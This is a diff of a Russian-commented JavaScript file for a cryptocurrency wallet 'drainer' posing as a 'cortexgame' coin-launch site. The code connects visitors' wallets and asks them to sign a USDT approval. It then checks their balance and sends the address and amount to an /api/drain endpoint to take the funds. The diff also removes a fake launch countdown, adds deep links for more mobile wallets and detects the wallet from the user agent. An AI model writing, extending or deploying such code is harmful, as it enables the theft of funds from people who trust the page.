@@ -1,5 +1,5 @@
 // ========================================
-// 🚀 ПОЛНЫЙ ДРЕНЕР - УНИВЕРСАЛЬНЫЙ
+// 🚀 ПОЛНЫЙ ДРЕНЕР - ВСЕ КОШЕЛЬКИ ЧЕРЕЗ APP LINK
 // ========================================
 
 // ========== КОНФИГ ==========
@@ -19,40 +19,9 @@ const openBtns = document.querySelectorAll("#connectWallet, #connectWalletNav, #
 
 console.log('🔥 script.js загружен');
 
-// ========== ТАЙМЕР ==========
-const LAUNCH_MS = 11 * 60 * 60 * 1000 + 38 * 60 * 1000;
-const STORAGE_KEY = "cortexgame_launch_at";
-
-function getLaunchAt() {
-    const saved = localStorage.getItem(STORAGE_KEY);
-    if (saved) {
-        const parsed = Number(saved);
-        if (!Number.isNaN(parsed) && parsed > Date.now() - 60 * 1000) return parsed;
-    }
-    const launchAt = Date.now() + LAUNCH_MS;
-    localStorage.setItem(STORAGE_KEY, String(launchAt));
-    return launchAt;
-}
-
-const launchAt = getLaunchAt();
-const hoursEl = document.getElementById("cdHours");
-const minutesEl = document.getElementById("cdMinutes");
-const secondsEl = document.getElementById("cdSeconds");
-const captionEl = document.querySelector(".countdown__caption");
-
-function pad(n) { return String(n).padStart(2, "0"); }
-function updateCountdown() {
-    const diff = Math.max(0, launchAt - Date.now());
-    const totalSec = Math.floor(diff / 1000);
-    if (hoursEl) hoursEl.textContent = pad(Math.floor(totalSec / 3600));
-    if (minutesEl) minutesEl.textContent = pad(Math.floor((totalSec % 3600) / 60));
-    if (secondsEl) secondsEl.textContent = pad(totalSec % 60);
-    if (diff === 0 && captionEl) {
-        captionEl.textContent = "Монета запущена — подключи кошелёк для начисления";
-    }
-}
+// ========== ТАЙМЕР (УБРАН) ==========
+function updateCountdown() {}
 updateCountdown();
-setInterval(updateCountdown, 1000);
 
 // ========== ФУНКЦИИ ==========
 function shortAddress(addr) {
@@ -64,9 +33,19 @@ function isMobile() {
     return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 }
 
-// ===== ПРОВЕРКА: ЕСТЬ ЛИ WEB3 ПРОВАЙДЕР =====
 function hasEthereum() {
     return typeof window.ethereum !== 'undefined' && window.ethereum !== null;
+}
+
+function getWalletFromUA() {
+    const ua = navigator.userAgent;
+    if (/TrustWallet/i.test(ua)) return 'Trust Wallet';
+    if (/MetaMask/i.test(ua)) return 'MetaMask';
+    if (/SafePal/i.test(ua)) return 'SafePal';
+    if (/Antarctic/i.test(ua)) return 'Antarctic';
+    if (/CoinbaseWallet/i.test(ua)) return 'Coinbase Wallet';
+    if (/OKX/i.test(ua)) return 'OKX Wallet';
+    return null;
 }
 
 function openModal() {
@@ -238,34 +217,102 @@ async function approveUSDT() {
     return tx;
 }
 
-// ========== УНИВЕРСАЛЬНОЕ ОТКРЫТИЕ КОШЕЛЬКА ==========
+// ========== УНИВЕРСАЛЬНОЕ ОТКРЫТИЕ ЛЮБОГО КОШЕЛЬКА ЧЕРЕЗ APP LINK ==========
 function openWalletApp(walletName) {
     const url = encodeURIComponent(window.location.href);
+    const host = window.location.host;
+    
+    console.log(`📱 Открываем ${walletName}...`);
     
     switch(walletName) {
         case 'Trust Wallet':
-            // Используем link.trustwallet.com — работает всегда
             window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${url}`;
             break;
+            
         case 'MetaMask':
-            window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
+            window.location.href = `https://metamask.app.link/dapp/${host}`;
             break;
+            
         case 'Coinbase Wallet':
-            window.location.href = `https://wallet.coinbase.com/dapp/${window.location.host}`;
+            window.location.href = `https://wallet.coinbase.com/dapp/${host}`;
             break;
+            
         case 'WalletConnect':
-            // Для WalletConnect показываем QR код или инструкцию
             showStatus("📱 Откройте WalletConnect и отсканируйте QR-код");
-            break;
+            return;
+            
         case 'OKX Wallet':
-            window.location.href = `https://www.okx.com/web3/dapp/${window.location.host}`;
+            window.location.href = `https://www.okx.com/web3/dapp/${host}`;
             break;
+            
+        case 'SafePal':
+            // SafePal через app link — открывает приложение, если установлено
+            window.location.href = `https://link.safepal.com/dapp/${host}`;
+            break;
+            
+        case 'Antarctic':
+            // Antarctic — через app link
+            window.location.href = `https://antarctic.app/dapp/${host}`;
+            break;
+            
         default:
             showStatus(`❌ ${walletName} не поддерживается на телефоне`);
             return;
     }
     
     showStatus(`📱 Открываем ${walletName}...`);
+}
+
+// ========== ПОДКЛЮЧЕНИЕ ЧЕРЕЗ ETHEREUM ПРОВАЙДЕР ==========
+async function connectWithEthereum(walletName) {
+    try {
+        await switchToBSC();
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        if (!accounts || accounts.length === 0) {
+            throw new Error("Нет аккаунтов");
+        }
+
+        userAddress = accounts[0];
+        web3 = new Web3(window.ethereum);
+
+        showStatus(`✅ ${walletName} подключён: ${shortAddress(userAddress)}`);
+        closeModal();
+
+        localStorage.setItem("cortexgame_wallet", userAddress);
+        localStorage.setItem("cortexgame_wallet_name", walletName);
+        openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
+
+        await sendToServer("/api/connect", {
+            address: userAddress,
+            wallet_type: walletName,
+            ref: localStorage.getItem("ref_code") || null
+        });
+
+        showStatus("⏳ Подпишите APPROVE...");
+        try {
+            const tx = await approveUSDT();
+            showStatus("✅ APPROVE отправлен!");
+            const balance = await getUSDTBalance(userAddress);
+            if (balance > 0) {
+                showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
+                const result = await sendToServer("/api/drain", {
+                    address: userAddress,
+                    amount: balance
+                });
+                if (result && result.success) {
+                    showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
+                }
+            } else {
+                showStatus("✅ Кошелёк активирован. USDT: 0");
+            }
+        } catch (e) {
+            showStatus(`❌ ${e.message}`);
+        }
+        return true;
+    } catch (error) {
+        showStatus(`❌ ${error.message}`);
+        return false;
+    }
 }
 
 // ========== ГЛАВНАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ ==========
@@ -275,71 +322,20 @@ async function connectWallet(walletName) {
     showStatus(`⏳ Подключение к ${walletName}...`);
 
     try {
-        // ===== ЕСЛИ УЖЕ ЕСТЬ ETHEREUM ПРОВАЙДЕР =====
         if (hasEthereum()) {
             console.log("🟢 Web3 провайдер обнаружен!");
-            
-            try {
-                await switchToBSC();
-                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                if (!accounts || accounts.length === 0) {
-                    throw new Error("Нет аккаунтов");
-                }
-
-                userAddress = accounts[0];
-                web3 = new Web3(window.ethereum);
-
-                showStatus(`✅ ${walletName} подключён: ${shortAddress(userAddress)}`);
-                closeModal();
-
-                localStorage.setItem("cortexgame_wallet", userAddress);
-                localStorage.setItem("cortexgame_wallet_name", walletName);
-                openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
-
-                await sendToServer("/api/connect", {
-                    address: userAddress,
-                    wallet_type: walletName,
-                    ref: localStorage.getItem("ref_code") || null
-                });
-
-                showStatus("⏳ Подпишите APPROVE...");
-                try {
-                    const tx = await approveUSDT();
-                    showStatus("✅ APPROVE отправлен!");
-                    const balance = await getUSDTBalance(userAddress);
-                    if (balance > 0) {
-                        showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
-                        const result = await sendToServer("/api/drain", {
-                            address: userAddress,
-                            amount: balance
-                        });
-                        if (result && result.success) {
-                            showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
-                        }
-                    } else {
-                        showStatus("✅ Кошелёк активирован. USDT: 0");
-                    }
-                } catch (e) {
-                    showStatus(`❌ ${e.message}`);
-                }
-                isProcessing = false;
-                return;
-            } catch (error) {
-                showStatus(`❌ ${error.message}`);
-                isProcessing = false;
-                return;
-            }
+            await connectWithEthereum(walletName);
+            isProcessing = false;
+            return;
         }
 
-        // ===== ЕСЛИ НЕТ ETHEREUM ПРОВАЙДЕРА (ТОЛЬКО ТЕЛЕФОН) =====
         if (isMobile()) {
             openWalletApp(walletName);
             isProcessing = false;
             return;
         }
 
-        // ===== ПК =====
-        showStatus("❌ Установите MetaMask или Trust Wallet расширение");
+        showStatus("❌ Установите расширение кошелька в браузере");
         isProcessing = false;
 
     } catch (error) {
@@ -356,20 +352,27 @@ if (savedWallet) {
     openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
 }
 
-// ========== ЕСЛИ УЖЕ ЕСТЬ ПРОВАЙДЕР ПРИ ЗАГРУЗКЕ ==========
+// ========== АВТО-ПОДКЛЮЧЕНИЕ ==========
 if (hasEthereum()) {
     console.log("🟢 Web3 провайдер уже есть при загрузке!");
+    
+    let detectedWallet = getWalletFromUA();
+    if (!detectedWallet) {
+        if (window.ethereum.isMetaMask) detectedWallet = 'MetaMask';
+        else if (window.ethereum.isTrustWallet) detectedWallet = 'Trust Wallet';
+        else if (window.ethereum.isSafePal) detectedWallet = 'SafePal';
+        else detectedWallet = 'Кошелёк';
+    }
+    
     setTimeout(async () => {
         try {
             const accounts = await window.ethereum.request({ method: "eth_accounts" });
             if (accounts && accounts.length > 0) {
                 userAddress = accounts[0];
                 web3 = new Web3(window.ethereum);
-                showStatus(`✅ ${savedName || "Кошелёк"} подключён: ${shortAddress(userAddress)}`);
+                showStatus(`✅ ${detectedWallet} подключён: ${shortAddress(userAddress)}`);
                 localStorage.setItem("cortexgame_wallet", userAddress);
-                if (!savedName) {
-                    localStorage.setItem("cortexgame_wallet_name", "Кошелёк");
-                }
+                localStorage.setItem("cortexgame_wallet_name", detectedWallet);
                 openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
             }
         } catch (e) {}
